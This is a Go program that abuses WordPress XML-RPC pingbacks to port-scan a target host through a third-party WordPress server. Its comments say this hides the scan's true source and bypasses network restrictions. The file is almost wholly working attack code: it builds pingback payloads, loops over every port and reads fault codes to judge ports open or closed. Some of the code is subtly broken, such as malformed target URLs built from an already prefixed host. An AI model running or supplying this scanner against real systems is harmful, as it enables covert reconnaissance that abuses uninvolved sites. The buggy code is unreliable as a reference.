// WordPress Pingback Port Scanner leverages XML-RPC pingback functionality to perform
// network port scanning through a vulnerable WordPress instance. The technique works
// by sending pingback requests that cause the WordPress server to attempt connections
// to various ports on a target system. By analyzing the error codes returned by
// WordPress, the scanner can determine whether ports are open or closed without
// making direct connections from the attacker's machine. This method can bypass
// network restrictions and hide the true source of the scan, making it appear as
// if the WordPress server is performing the connections.

package main

import (
	"encoding/xml"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"time"
)

type methodResponse struct {
	XMLName xml.Name `xml:"methodResponse"`
	Fault   *struct {
		Value struct {
			Struct struct {
				Member []struct {
					Name  string `xml:"name"`
					Value struct {
						Int    *int    `xml:"int,omitempty"`
						String *string `xml:"string,omitempty"`
					} `xml:"value"`
				} `xml:"member"`
			} `xml:"struct"`
		} `xml:"value"`
	} `xml:"fault"`
	Params *struct {
		Param []struct {
			Value struct {
				String *string `xml:"string,omitempty"`
			} `xml:"value"`
		} `xml:"param"`
	} `xml:"params"`
}

func buildPingbackXML(source, target string) string {
	replacer := strings.NewReplacer("&", "&amp;", "<", "&lt;", ">", "&gt;", `"`, "&quot;")
	escapedSource := replacer.Replace(source)
	escapedTarget := replacer.Replace(target)

	return fmt.Sprintf(`<?xml version="1.0"?>
<methodCall>
  <methodName>pingback.ping</methodName>
  <params>
    <param><value><string>%s</string></value></param>
    <param><value><string>%s</string></value></param>
  </params>
</methodCall>`, escapedSource, escapedTarget)
}

func isPortOpen(responseBody string) bool {
	// WordPress error codes that indicate the port is OPEN (target was reached)
	// 17: The source URL does not contain a link to the target URL
	// 32: We cannot find a title on that page
	openMatch := strings.Contains(responseBody, "<value><int>17</int></value>") ||
		strings.Contains(responseBody, "<value><int>32</int></value>")

	// Port is closed if we get error 16: The source URL does not exist
	closedMatch := strings.Contains(responseBody, "<value><int>16</int></value>")

	return openMatch && !closedMatch
}

func main() {
	wpSite := "http://wpsite.com/"
	targetHost := "http://target.com/"

	client := &http.Client{
		Timeout: 10 * time.Second,
	}

	fmt.Printf("Pingback scan: %s -> %s\n\n", wpSite, targetHost)

	testURL := "http://www.google.com"
	pingbackXML := buildPingbackXML("http://example.com/test.html", testURL)
	req, err := http.NewRequest(http.MethodPost, strings.TrimRight(wpSite, "/")+"/xmlrpc.php", strings.NewReader(pingbackXML))
	if err != nil {
		fmt.Printf("Error creating test request: %v\n", err)
		return
	}
	req.Header.Set("Content-Type", "text/xml")

	resp, err := client.Do(req)
	if err != nil {
		fmt.Printf("Error testing XML-RPC: %v\n", err)
		return
	}

	bodyBytes, _ := io.ReadAll(resp.Body)
	resp.Body.Close()

	if !isPortOpen(string(bodyBytes)) {
		fmt.Printf("XML-RPC test failed. Response: %s\n", string(bodyBytes))
		fmt.Println("This WordPress site may not be vulnerable to pingback attacks.")
		return
	}

	fmt.Println("XML-RPC is working. Starting port scan...\n")

	for port := 1; port <= 65536; port++ {
		targetURL := fmt.Sprintf("http://%s:%d/", targetHost, port)

		if _, err := url.ParseRequestURI(targetURL); err != nil {
			continue
		}

		pingbackXML := buildPingbackXML("http://example.com/test.html", targetURL)
		req, err := http.NewRequest(http.MethodPost, strings.TrimRight(wpSite, "/")+"/xmlrpc.php", strings.NewReader(pingbackXML))
		if err != nil {
			continue
		}
		req.Header.Set("Content-Type", "text/xml")

		resp, err := client.Do(req)
		if err != nil {
			continue
		}

		bodyBytes, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		responseBody := string(bodyBytes)

		if resp.StatusCode != 200 {
			continue
		}

		if isPortOpen(responseBody) {
			fmt.Printf("Port %d: OPEN\n", port)
		} else {
			var mr methodResponse
			if err := xml.Unmarshal(bodyBytes, &mr); err == nil && mr.Fault != nil {
				faultCode := 0
				for _, member := range mr.Fault.Value.Struct.Member {
					if member.Name == "faultCode" && member.Value.Int != nil {
						faultCode = *member.Value.Int
						break
					}
				}
				fmt.Printf("Port %d: CLOSED (fault code: %d)\n", port, faultCode)
			} else {
				fmt.Printf("Port %d: CLOSED (unexpected response)\n", port)
			}
		}

		time.Sleep(100 * time.Millisecond)
	}

	fmt.Println("\nScan completed.")
}
